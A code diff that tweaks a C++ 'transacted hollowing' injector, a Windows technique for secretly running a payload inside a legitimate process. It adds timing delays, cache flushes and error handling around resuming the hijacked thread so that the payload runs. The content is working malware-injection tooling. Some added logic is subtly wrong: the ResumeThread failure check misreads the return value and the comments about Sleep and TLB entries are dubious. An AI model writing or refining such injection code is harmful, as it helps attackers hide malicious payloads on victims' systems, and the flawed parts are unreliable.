@@ -74,7 +74,19 @@ PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
             return NULL;
         }
     }
+    
     std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
+    std::cout << "View Size:\t" << std::hex << viewSize << "\n";
+    
+    // After mapping, add a small delay to ensure the mapping is fully committed
+    Sleep(20);
+    
+    // Flush the process' working set to ensure pages are present
+    // This helps prevent page faults during early execution
+    if (!FlushViewOfFile(sectionBaseAddress, viewSize)) {
+        std::cerr << "[WARNING] Failed to flush view of file, but continuing...\n";
+    }
+    
     return sectionBaseAddress;
 }
 
@@ -116,8 +128,34 @@ DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSi
         std::cerr << "Failed to redirect!\n";
         return false;
     }
-    std::cout << "Resuming, PID " << std::dec << pi.dwProcessId << std::endl;
-    //Resume the thread and let the payload run:
-    ResumeThread(pi.hThread);
+    
+    std::cout << "Redirected entry point, waiting for initialization...\n";
+    
+    // Critical: Add delay to ensure the injected code is fully initialized
+    // The system needs time to:
+    // 1. Flush any outstanding memory writes
+    // 2. Update TLB entries
+    // 3. Prepare the injected thread for execution
+    Sleep(100);  // 100ms delay for system stabilization
+    
+    // Flush instruction cache to ensure the CPU sees the new code
+    FlushInstructionCache(pi.hProcess, remote_base, payloadSize);
+    
+    // Add another small delay after cache flush
+    Sleep(50);
+    
+    std::cout << "Resuming thread, PID " << std::dec << pi.dwProcessId << std::endl;
+    
+    // Resume the thread and let the payload run
+    if (!ResumeThread(pi.hThread)) {
+        std::cerr << "Failed to resume thread! Error: " << GetLastError() << "\n";
+        // Clean up on failure
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return false;
+    }
+    
+    std::cout << "Thread resumed successfully, payload executing...\n";
     return pi.dwProcessId;
 }
